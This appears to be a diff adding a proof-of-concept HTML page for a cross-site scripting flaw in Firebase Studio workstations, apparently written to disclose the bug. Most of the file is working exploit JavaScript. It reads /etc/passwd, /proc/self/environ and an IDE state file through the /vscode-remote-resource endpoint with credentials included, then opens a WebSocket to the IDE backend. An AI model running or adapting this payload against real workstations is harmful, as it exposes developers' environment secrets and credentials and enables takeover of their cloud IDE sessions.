@@ -1,0 +1,45 @@
+<html><head><title>Firebase Studio XSS-to-Credential-Theft PoC</title></head><body>
+<h2>Firebase Studio XSS-to-Credential-Theft PoC</h2>
+<p><b>Vulnerability:</b> /vscode-remote-resource serves HTML files with Content-Type: text/html and NO Content-Security-Policy header.</p>
+<p><b>Attack:</b> Load this file via: <code>https://WORKSTATION.cloudworkstations.dev/vscode-remote-resource?path=/home/user/REPO/payload.html</code></p>
+<p><b>Impact:</b> JavaScript executes on the workstation origin → reads all files, steals credentials, connects to IDE WebSocket.</p>
+<hr>
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function l(m){L.textContent+=m+'\n';}
+l('=== XSS on workstation domain ===');
+l('Origin: '+location.origin);
+l('Domain: '+document.domain);
+l('Cookie length: '+document.cookie.length);
+l('');
+
+var files=['/etc/passwd','/proc/self/environ','/home/.idx/.state.json'];
+files.forEach(function(f){
+  fetch('/vscode-remote-resource?path='+encodeURIComponent(f),{credentials:'include'})
+  .then(function(r){return r.text();})
+  .then(function(t){
+    if(f==='/proc/self/environ') t=t.replace(/\0/g,'\n');
+    l('=== '+f+' ===');
+    l(t.substring(0,500));
+    l('');
+  })
+  .catch(function(e){l('ERR '+f+': '+e.message);});
+});
+
+setTimeout(function(){
+  l('=== WebSocket Test (same-origin) ===');
+  var ws=new WebSocket((location.protocol==='https:'?'wss://':'ws://')+location.host+'/?reconnectionToken=xss-poc&reconnection=false&skipWebSocketFrames=false');
+  ws.binaryType='arraybuffer';
+  ws.onopen=function(){l('WS CONNECTED from XSS context! readyState='+ws.readyState);};
+  ws.onmessage=function(e){
+    if(e.data instanceof ArrayBuffer){
+      l('WS MSG: binary '+e.data.byteLength+' bytes, type=0x'+new Uint8Array(e.data)[0].toString(16));
+    } else {
+      l('WS MSG: '+e.data.substring(0,200));
+    }
+  };
+  ws.onerror=function(){l('WS ERROR');};
+  ws.onclose=function(e){l('WS CLOSED code='+e.code);};
+},2000);
+</script></body></html>
